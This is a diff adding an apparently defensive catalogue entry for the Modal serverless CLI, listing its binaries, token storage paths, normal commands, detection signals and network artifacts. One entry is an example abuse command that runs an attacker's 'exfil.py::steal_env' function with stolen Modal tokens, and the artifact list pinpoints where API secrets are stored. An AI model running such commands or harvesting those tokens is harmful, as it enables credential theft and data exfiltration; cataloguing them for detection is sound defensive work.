@@ -1,0 +1,154 @@
+Name: Modal CLI
+Id: modal
+Category: cloud_mlops
+Vendor: Modal Labs
+Description: Modal serverless cloud CLI (`pip install modal`). Deploys and runs Python
+  functions on Modal infrastructure. Local config/token storage under ~/.modal/ (or
+  %USERPROFILE%\.modal\).
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - modal
+  - modal.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://modal.com/docs
+  OfficialUrl: https://modal.com/docs
+  CliExecutable: modal
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  InstallationPaths:
+  - ~/.modal.toml
+  - '%USERPROFILE%\.modal.toml'
+  ConfigDirs:
+    macOS: ~/.modal.toml (primary); ~/.modal/ may exist for ancillary state
+    Linux: ~/.modal.toml (primary)
+    Windows: '%USERPROFILE%\.modal.toml (primary)'
+  Packages:
+    pip:
+    - modal
+Commands:
+- Command: modal token set --token-id "$ID" --token-secret "$SECRET"
+  Description: Store Modal API tokens in ~/.modal.toml (normal auth setup)
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: modal --help
+  Description: Show Modal CLI help
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: modal run app.py::main
+  Description: Run deployed Modal function (normal cloud workflow)
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: MODAL_TOKEN_ID="$STOLEN" MODAL_TOKEN_SECRET="$STOLEN" modal run exfil.py::steal_env
+    --env
+  Description: Stolen Modal tokens run attacker-defined cloud function with host env
+    access
+  Category: Bypass
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: modal-attribution
+  Name: modal attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: modal
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: modal
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where Modal CLI is installed for ML ops.
+    Corroborate with ~/.modal/ token files and modal.com network egress.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: modal.com/docs + PyPI
+  EmpiricalNotes: Linux lab probe found `modal` on PATH (pip install). Official token
+    storage is ~/.modal.toml ([default] token_id/token_secret), not token.json. MODAL_TOKEN_ID/SECRET
+    env overrides file. No agentic shell on host — abuse is stolen-token cloud execution.
+    Primary CLI or desktop binary empirically present on lab PATH or documented install
+    footprint (2026-07-19 revalidation).
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://modal.com/docs
+  Title: Modal documentation
+- Link: https://modal.com/docs/reference/modal.config
+  Title: Modal CLI configuration (.modal.toml)
+- Link: https://pypi.org/project/modal/
+  Title: PyPI modal
+Uuid: 2ec4e0a7-d60f-54e8-a127-f65ab5ae6f60
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: false
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  - empirical
+  Notes: Linux probe confirmed modal binary; macOS and Windows probes did not.
+Artifacts:
+  Disk:
+  - Path: ~/.modal.toml
+    Notes: Primary Modal CLI config (token_id/token_secret)
+    Platform: macOS
+  - Path: ~/.modal.toml
+    Notes: Primary Modal CLI config (token_id/token_secret)
+    Platform: Linux
+  - Path: '%USERPROFILE%\.modal.toml'
+    Notes: Primary Modal CLI config (token_id/token_secret)
+    Platform: Windows
+  ConfigFiles:
+  - Path: ~/.modal.toml
+    Notes: Primary Modal CLI config (token_id/token_secret under [default])
+  AuthTokens:
+  - Path: ~/.modal.toml
+    Notes: token_id and token_secret in [default] section (sensitive)
+  Environment:
+  - Path: env MODAL_TOKEN_ID
+    Notes: Modal API token ID
+  - Path: env MODAL_TOKEN_SECRET
+    Notes: Modal API token secret
+  Network:
+  - Domains:
+    - modal.com
+    Description: Modal control plane and API
+  - Domains:
+    - '*.modal.run'
+    Description: Deployed function endpoints (customer-specific)
